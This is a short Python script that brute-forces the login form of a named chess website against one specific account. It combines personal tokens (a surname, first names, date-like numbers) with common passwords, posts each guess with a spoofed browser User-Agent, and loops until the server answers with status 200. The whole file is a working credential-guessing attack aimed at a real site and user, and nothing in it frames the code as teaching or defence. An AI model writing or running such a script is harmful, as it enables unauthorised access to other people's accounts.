import requests, random

i = 0
dictionary = ["24", "01", "2013", "_", "Efremov", "efremov", "Art", "art", "Don", "don", "chess", "Chess", "3", "qwerty", "12345678", "1234567890", "password", "Artem", "artem"]
while 1:
  password = ''
  k = i
 # print(k)
  while (k > 1):
#        print(k%len(dictionary), k)
        password = password + dictionary[k%len(dictionary)]
        k = k // len(dictionary)
  r = requests.post(
     "https://mskchess.ru/login",
     {"username" : "Mskchess_YES", "password" : password},
     headers = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"},
     #'446667c718540e5a9b16abe071fb06182afca0bf-sessionId=8J411kFdFxt8FUm8SEK94I&sid=2gvAoRqaunf6l3pna64iRx'
  )
  i = i + 1
  print(r.status_code)
  if (r.status_code == 200):
     print("!! Password: ", password)
     break
  print("CHECKED PASSWORD", password)
  print(i, "passwords checked!")